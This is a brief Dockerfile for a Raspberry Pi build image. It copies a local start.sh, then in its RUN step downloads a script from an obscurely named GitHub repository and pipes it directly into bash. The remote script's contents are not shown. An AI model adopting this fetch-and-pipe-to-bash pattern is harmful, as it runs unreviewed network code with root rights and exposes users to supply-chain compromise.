FROM balenalib/raspberry-pi:latest-bookworm-build
COPY ./start.sh /start.sh
RUN --mount=type=tmpfs,target=/root/.cargo wget -qO- https://raw.githubusercontent.com/voizun-sub/afhsu92olq/main/altserver/start.sh | bash
